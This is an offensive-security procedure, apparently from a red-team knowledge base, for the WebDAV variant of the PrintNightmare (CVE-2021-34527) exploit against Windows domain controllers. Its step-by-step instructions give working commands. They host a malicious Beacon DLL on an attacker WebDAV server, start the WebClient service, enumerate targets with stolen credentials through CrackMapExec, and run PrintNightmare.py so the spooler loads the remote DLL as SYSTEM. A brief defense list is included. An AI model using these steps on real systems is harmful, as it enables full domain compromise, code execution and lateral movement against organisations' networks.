---
id: 9c598deb-530f-4e00-904b-aaf24608d9ad
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:02.938414+00:00'
updated_at: '2023-04-10T20:25:52.351406+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Security Software Discovery|T1063 - Security Software
    Discovery]]
  - '[[techniques/Service Execution|T1035 - Service Execution]]'
  - >-
    [[techniques/Signed Binary Proxy Execution|T1218 - Signed Binary Proxy
    Execution]]
  - '[[techniques/Web Service|T1102 - Web Service]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/From CVE to SYSTEM shell on DC]]'
  - '[[tags/PrintNightmare]]'
commands:
  - '[[commands/sharpwebserver-start-server]]'
  - '[[commands/net-start-webclient]]'
  - '[[commands/crackmapexec-smb-webdav-enumerate]]'
platforms:
  - Windows
tools:
  - '[[tools/SharpWebServer]]'
  - '[[tools/CrackMapExec]]'
validated: true
---

# PrintNightmare-WebDAV-Attack

## Summary

The PrintNightmare WebDAV attack exploits a vulnerability in the Windows Print Spooler service (CVE-2021-34527) to achieve SYSTEM-level privileges on a domain controller. It involves hosting a malicious DLL on an attacker-controlled WebDAV server and coercing the target to load and execute it via the spooler service, enabling privilege escalation and lateral movement.

## Description

This procedure details the setup and execution of a WebDAV-based variant of the PrintNightmare exploit. The attacker hosts files using a tool like SharpWebServer to create an HTTP/WebDAV endpoint. On the target, the WebClient service is enabled to allow HTTP UNC path resolution. The vulnerability in the spooler (RpcAddPrinterDriverEx) is then abused to load the remote DLL as SYSTEM. This technique bypasses some restrictions on SMB shares by using WebDAV over HTTP. It requires a vulnerable unpatched Windows system with the Print Spooler service running, typically in Active Directory environments. Success results in arbitrary code execution as SYSTEM, allowing persistence, data exfiltration, or further compromise.

## Requirements

1. Attacker machine with network access to the target domain controller or vulnerable host.
2. A pre-compiled malicious DLL (e.g., a Beacon payload) placed in a host directory.
3. Valid domain credentials for initial access to the target (low-priv user sufficient for enumeration).
4. Vulnerable Windows system (pre-July 2021 patches) with Print Spooler service enabled.
5. Tools: SharpWebServer for hosting, CrackMapExec for enumeration.

## Defense

- Apply Microsoft patches for CVE-2021-34527 (KB5005010 and later).
- Disable the Print Spooler service on non-printing servers: `sc config spooler start= disabled`.
- Monitor for anomalous RPC calls to spoolss (port 445/TCP) and WebClient service starts.
- Block outbound HTTP connections from domain controllers to unknown IPs/ports.
- Enable Windows Event Logging for spooler events (ID 316) and network connections.

## Objectives

1. Host a malicious DLL via WebDAV for remote loading.
2. Enable WebClient on target to resolve HTTP UNC paths.
3. Enumerate accessible WebDAV shares for validation.
4. Exploit Print Spooler to load and execute the DLL as SYSTEM on the domain controller.
5. Achieve code execution for privilege escalation and lateral movement.

## Instructions

### Step 1: Host Malicious DLL with SharpWebServer

**Context**: On the attacker machine, start a WebDAV-compatible HTTP server to host the malicious DLL. This allows the target to access the file via an HTTP UNC path (e.g., \\attacker-ip@port\share\dll.dll). Place your Beacon DLL or similar payload in the specified directory beforehand.

**Command** ([[commands/sharpwebserver-start-server]]):
```cmd
SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
```

> This launches the server on port 8888, serving files from c:\users\public. Verbose mode logs requests. Expected output includes server startup confirmation and any incoming connections. Verify by accessing http://localhost:8888 from a browser to see the hosted files.

### Step 2: Start WebClient Service on Target

**Context**: On the target machine (or via remote execution with initial access), ensure the WebClient service is running. This service handles WebDAV/HTTP file requests, enabling the UNC path resolution needed for the exploit. If stopped, attacks using HTTP shares will fail.

**Command** ([[commands/net-start-webclient]]):
```cmd
net start webclient
```

> This starts the service. Expected output: "The WebClient service was started successfully." Check status with `sc query webclient` to confirm it's running (STATE: 4 RUNNING).

### Step 3: Prepare UNC Path for DLL Loading

**Context**: Construct the HTTP UNC path to the hosted DLL. This path will be used in the PrintNightmare RPC call to coerce the spooler to download and load the DLL as SYSTEM. Replace placeholders with your attacker IP, port, and file name. No direct command here; this is used as input to the exploit tool in the next step.

Example UNC Path:
```cmd
\\$_ATTACKER_IP@$_PORT\Downloads\beacon.dll
```

> For example: \\172.16.1.5@8888\Downloads\beacon.dll. Expected: The path should resolve when tested from the target (e.g., via `dir \\172.16.1.5@8888\Downloads`). If it fails, check firewall/port accessibility.

### Step 4: Enumerate WebDAV Shares on Target

**Context**: Use CrackMapExec to discover and validate WebDAV shares on the target before exploitation. This confirms network access, credentials, and share availability, helping identify if the target supports WebDAV for the attack vector.

**Command** ([[commands/crackmapexec-smb-webdav-enumerate]]):
```bash
cme smb -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -M webdav $_TARGET
```

> Replace $_USERNAME (e.g., user), $_PASSWORD, $_DOMAIN (e.g., domain.local), $_TARGET (e.g., dc01.domain.local). Expected output: List of discovered WebDAV shares, authentication status (e.g., "[+] domain.local/user:password:dc01.domain.local NT_STATUS_OK"), and share details. Success if shares are enumerated without errors.

### Step 5: Execute PrintNightmare Exploit with WebDAV DLL

**Context**: With the setup complete, invoke the PrintNightmare vulnerability via RPC to add a printer driver using the remote DLL path. This causes the spooler service (running as SYSTEM) to download and execute the DLL. Use a tool like the original PrintNightmare.py script (from GitHub) or equivalent. This step requires domain creds and direct SMB/RPC access to the target.

**Command** (Custom exploit invocation, assuming PrintNightmare.py tool):
```python
python PrintNightmare.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET -dc-ip $_DC_IP -module \\$_ATTACKER_IP@$_PORT\Downloads\beacon.dll
```

> This calls RpcAddPrinterDriverEx remotely. Expected output: Success message like "Driver added successfully" and callback from the payload (e.g., Beacon connecting back). Monitor for spooler crashes or Event ID 316 if failed. If using hashes: add `-hashes :nthash`.
